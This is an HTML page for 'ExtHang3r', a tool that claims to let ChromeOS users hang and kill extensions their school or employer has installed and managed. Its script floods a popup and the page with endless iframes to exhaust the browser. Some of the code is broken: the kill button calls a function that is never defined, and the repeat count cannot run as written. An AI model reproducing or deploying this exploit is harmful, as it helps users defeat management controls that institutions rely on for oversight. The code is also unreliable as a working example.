<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ExtHang3r</title>
    <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Jamama696969/ExtHang4r/refs/heads/main/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
    <style>
      body {
        font-family: 'Varela Round', sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f8f9fa;
        color: #333;
      }

      header {
        background-color: #343a40;
        color: #fff;
        padding: 10px 20px;
        text-align: center;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      }

      .logo {
        width: 50px;
        height: 50px;
        margin-right: 10px;
      }

      .container {
        max-width: 800px;
        margin: 100px auto 0 auto;
        padding: 20px;
        text-align: center;
        background: #fff;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
      }

      select {
        font-family: 'Varela Round', sans-serif;
        margin-bottom: 10px;
        padding: 10px;
        font-size: 16px;
        border: 1px solid #ced4da;
        border-radius: 4px;
        width: 100%;
      }

      button {
        font-family: 'Varela Round', sans-serif;
        background-color: #007bff;
        color: #fff;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        border-radius: 5px;
        margin-top: 10px;
        transition: background-color 0.3s ease;
      }

      button:hover {
        background-color: #0056b3;
      }

      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        color: #fff;
        font-size: 24px;
        user-select: none;
        flex-direction: column;
      }

      .spinner {
        border: 6px solid rgba(255, 255, 255, 0.3);
        border-top: 6px solid #fff;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin-bottom: 20px;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }

      #killExtensionText {
        display: none;
        margin-top: 20px;
        color: #333;
        font-size: 18px;
        text-align: center;
        background: #e9ecef;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      #killButton {
        display: none;
        background-color: #dc3545;
        color: #fff;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        border-radius: 5px;
        transition: background-color 0.3s ease;
      }

      #killButton:hover {
        background-color: #9c1c28;
      }

      footer {
        background-color: #343a40;
        color: #fff;
        text-align: center;
        padding: 10px;
        position: fixed;
        bottom: 0;
        width: 100%;
      }

      footer a {
        color: #007bff;
        text-decoration: none;
      }

      footer a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <header>
      <img src="https://raw.githubusercontent.com/Jamama696969/ExtHang4r/refs/heads/main/favicon.png" alt="Logo" class="logo">
      <h1>ExtHang3r</h1>
    </header>
    <div class="container">
      <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of March 2025.</p>
      <label for="iframeSelect" id="labelForIframeSelect">Extension Automatically Detected.</label>
      
      <div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
      </div>
      <button onclick="warning();" id="hangButton">Hang Extension!</button>
      <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
    </div>
    <div id="killExtensionText"></div>
    <footer>
      <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a>
      </p>
    </footer>
    <script>
      function replaceIframes(container, iframeSrc, iframeCount) {
        for (let i = 0; i < iframeCount; i++) {
          const iframe = document.createElement('iframe');
          iframe.src = iframeSrc;
          iframe.style.width = '100%';
          iframe.style.height = '100px';
          container.appendChild(iframe);
        }
        setTimeout(function() {
          while (container.firstChild) {
            container.removeChild(container.firstChild);
          }
          replaceIframes(container, iframeSrc, iframeCount);
        }, 5);
      }

      function warning() {
                let popup = window.open("", "popupWindow", "width=100,height=100");
                if (popup) {
                    let content = "<iframe>hi</iframe>".repeat(1000000000000000000000000);
                    popup.document.write(content);
                } else {
                    alert("Popup blocked! Please allow popups for this site.");
        }
      }

    </script>
  </body>
</html>
